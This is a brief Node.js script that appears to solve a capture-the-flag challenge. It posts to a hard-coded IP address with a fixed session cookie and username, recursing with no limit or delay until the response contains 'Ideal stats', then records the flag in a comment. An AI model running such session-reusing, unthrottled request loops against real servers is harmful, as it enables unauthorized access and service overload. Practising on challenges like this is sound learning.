const request = require('request');

let tryNumber = 0;

function req() {
    request.post('http://128.199.224.160:3002/', {
        headers: {
            'Cookie': 'PHPSESSID=fj3vk8ib77th8ru658pelr6091' // This is important
        },
        form: {
            username: 'danube'
        }
    }, function(err, response) {
        if (response.body.indexOf('Ideal stats') >= 0) {
            console.log(response.body);
        } else {
            console.log(response.body.split('\n').splice(25, 19).join('\n'));
            console.log(++tryNumber);
            req();
        }
    })
}

req();

// Flag: 
// flag{1m_7#3_brv73_w@2210r_0f_ju571c3}
